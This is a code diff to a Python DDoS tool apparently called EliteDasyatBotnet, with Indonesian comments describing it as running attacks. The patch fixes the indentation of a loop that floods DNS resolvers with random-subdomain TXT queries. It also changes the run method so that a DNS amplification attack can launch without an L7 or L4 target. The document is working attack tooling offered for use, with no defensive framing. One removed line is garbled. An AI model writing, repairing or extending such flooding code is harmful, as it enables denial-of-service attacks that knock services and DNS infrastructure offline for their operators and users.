@@ -172,7 +172,7 @@ class EliteDasyatBotnet:
         resolver.nameservers = self.dns_servers
         end_time = asyncio.get_event_loop().time() + self.duration
         while asyncio.get_event_loop().time() < end_time:
-        try:
+            try:
                 domain = f"{uuid.uuid4().hex}.example.com"
                 answer = await asyncio.get_event_loop().run_in_executor(
                     None, lambda: resolver.resolve(domain, 'TXT')
@@ -222,8 +222,8 @@ class EliteDasyatBotnet:
 
     async def run(self):
         """Jalankan serangan berdasarkan metode yang dipilih."""
-        if not self.target_l anna and not self.target_l4:
-            logging.error("At least one target (L7 or L4) is required")
+        if not self.target_l7 and not self.target_l4 and "dns" not in self.methods:
+            logging.error("At least one target (L7 or L4) is required unless using DNS amplification")
             return
         self.active_connections = self.max_connections
         tasks = []
